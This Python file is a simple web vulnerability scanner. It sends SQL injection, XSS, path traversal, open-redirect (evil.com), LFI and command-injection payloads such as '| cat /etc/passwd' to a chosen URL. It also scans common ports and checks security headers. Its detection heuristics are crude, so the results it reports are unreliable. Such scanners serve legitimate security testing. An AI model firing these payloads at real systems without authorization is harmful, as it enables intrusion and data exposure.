import requests
import socket
from urllib.parse import urljoin
from bs4 import BeautifulSoup
import re

# Define common payloads for testing vulnerabilities
SQLI_PAYLOADS = ["' OR 1=1 --", "' UNION SELECT null --", "' AND 1=2 --"]
XSS_PAYLOADS = ["<script>alert('XSS')</script>", "<img src='x' onerror='alert(1)'>"]
DIR_TRAVERSAL_PAYLOADS = ["../../etc/passwd", "../..//windows/win.ini"]
REDIRECT_PAYLOADS = ["//evil.com", "http://evil.com"]
RCE_PAYLOADS = ["; ls", "| cat /etc/passwd"]
LFI_PAYLOADS = ["../../../../etc/passwd", "../../../../windows/win.ini"]

class WebVulnerabilityScanner:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()

    def get_forms(self, url):
        """Retrieve all forms from a web page."""
        try:
            response = self.session.get(url)
            soup = BeautifulSoup(response.content, 'html.parser')
            return soup.find_all('form')
        except Exception as e:
            print(f"Error fetching forms: {e}")
            return []

    def submit_form(self, form, url, payload):
        """Submit a form with a given payload."""
        action = form.get("action")
        method = form.get("method", "get").lower()
        inputs = form.find_all("input")
        form_data = {}

        for input_tag in inputs:
            name = input_tag.get("name")
            input_type = input_tag.get("type", "text")
            value = input_tag.get("value", "")

            if input_type == "text" and name:
                form_data[name] = payload
            elif name:
                form_data[name] = value

        form_url = urljoin(url, action)
        if method == "post":
            return self.session.post(form_url, data=form_data)
        return self.session.get(form_url, params=form_data)

    def test_sqli(self, url):
        """Test for SQL Injection vulnerabilities."""
        print("\n[+] Testing for SQL Injection...")
        for payload in SQLI_PAYLOADS:
            response = self.session.get(url, params={"q": payload})
            if "sql" in response.text.lower() or "error" in response.text.lower():
                print(f"[!] SQL Injection vulnerability detected with payload: {payload}")

    def test_xss(self, url):
        """Test for XSS vulnerabilities."""
        print("\n[+] Testing for XSS...")
        for payload in XSS_PAYLOADS:
            response = self.session.get(url, params={"q": payload})
            if payload in response.text:
                print(f"[!] XSS vulnerability detected with payload: {payload}")

    def test_directory_traversal(self, url):
        """Test for Directory Traversal vulnerabilities."""
        print("\n[+] Testing for Directory Traversal...")
        for payload in DIR_TRAVERSAL_PAYLOADS:
            response = self.session.get(url, params={"file": payload})
            if "root:" in response.text or "[extensions]" in response.text:
                print(f"[!] Directory Traversal vulnerability detected with payload: {payload}")

    def test_open_redirect(self, url):
        """Test for Open Redirect vulnerabilities."""
        print("\n[+] Testing for Open Redirect...")
        for payload in REDIRECT_PAYLOADS:
            response = self.session.get(url, params={"redirect": payload})
            if payload in response.url:
                print(f"[!] Open Redirect vulnerability detected with payload: {payload}")

    def test_rce(self, url):
        """Test for Remote Code Execution vulnerabilities."""
        print("\n[+] Testing for Remote Code Execution...")
        for payload in RCE_PAYLOADS:
            response = self.session.get(url, params={"cmd": payload})
            if "root:" in response.text or "bin" in response.text:
                print(f"[!] Remote Code Execution vulnerability detected with payload: {payload}")

    def test_lfi(self, url):
        """Test for Local File Inclusion vulnerabilities."""
        print("\n[+] Testing for Local File Inclusion...")
        for payload in LFI_PAYLOADS:
            response = self.session.get(url, params={"file": payload})
            if "root:" in response.text or "[extensions]" in response.text:
                print(f"[!] Local File Inclusion vulnerability detected with payload: {payload}")

    def test_insecure_headers(self, url):
        """Test for insecure HTTP headers."""
        print("\n[+] Checking HTTP headers...")
        response = self.session.get(url)
        missing_headers = []

        if "Content-Security-Policy" not in response.headers:
            missing_headers.append("Content-Security-Policy")
        if "X-Content-Type-Options" not in response.headers:
            missing_headers.append("X-Content-Type-Options")
        if "X-Frame-Options" not in response.headers:
            missing_headers.append("X-Frame-Options")

        if missing_headers:
            print(f"[!] Insecure headers detected: {', '.join(missing_headers)}")
        else:
            print("[+] All essential security headers are present.")

    def scan_forms(self, url):
        """Scan all forms on the page for vulnerabilities."""
        print("\n[+] Scanning forms on the page...")
        forms = self.get_forms(url)
        for form in forms:
            print(f"\n[+] Found form: {form}")
            for payload in XSS_PAYLOADS:
                response = self.submit_form(form, url, payload)
                if payload in response.text:
                    print(f"[!] XSS vulnerability detected in form with payload: {payload}")

    def scan_ports(self):
        """Scan common ports for the target host."""
        print("\n[+] Scanning common ports...")
        try:
            host = self.base_url.replace("http://", "").replace("https://", "").split("/")[0]
            common_ports = {80: "HTTP", 443: "HTTPS", 21: "FTP", 22: "SSH", 25: "SMTP"}
            for port, service in common_ports.items():
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((host, port))
                if result == 0:
                    print(f"[+] Open port detected: {port} ({service})")
                sock.close()
        except Exception as e:
            print(f"Error during port scan: {e}")

    def detect_technology(self):
        """Detect web technologies used by the target."""
        print("\n[+] Detecting web technologies...")
        try:
            response = self.session.get(self.base_url)
            headers = response.headers
            server = headers.get("Server", "Unknown")
            x_powered_by = headers.get("X-Powered-By", "Unknown")
            print(f"[+] Server: {server}")
            print(f"[+] X-Powered-By: {x_powered_by}")
        except Exception as e:
            print(f"Error detecting technologies: {e}")

    def scan(self):
        """Start scanning the base URL."""
        print(f"\nStarting scan on {self.base_url}")
        self.scan_ports()
        self.detect_technology()
        self.test_sqli(self.base_url)
        self.test_xss(self.base_url)
        self.test_directory_traversal(self.base_url)
        self.test_open_redirect(self.base_url)
        self.test_rce(self.base_url)
        self.test_lfi(self.base_url)
        self.test_insecure_headers(self.base_url)
        self.scan_forms(self.base_url)

if __name__ == "__main__":
    base_url = input("Enter the base URL to scan (e.g., http://example.com): ").strip()
    scanner = WebVulnerabilityScanner(base_url)
    scanner.scan()
